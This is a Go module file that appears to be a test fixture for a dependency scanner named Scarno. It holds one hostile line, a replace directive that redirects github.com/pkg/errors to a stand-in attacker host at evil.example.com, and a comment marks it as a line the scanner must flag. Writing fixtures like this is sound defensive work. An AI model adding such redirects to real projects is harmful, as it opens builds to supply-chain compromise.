module example.com/adversarial/replace_remote_url

go 1.22

require (
	github.com/pkg/errors v0.9.1
	github.com/stretchr/testify v1.8.4
)

// Malicious replace directive pointing at an attacker-controlled URL.
// Scarno must emit Finding TS-DS-002 (MEDIUM) for this line.
replace github.com/pkg/errors => https://evil.example.com/errors v0.0.1

// Benign local replace — must NOT trigger TS-DS-002.
replace github.com/stretchr/testify => ../testify
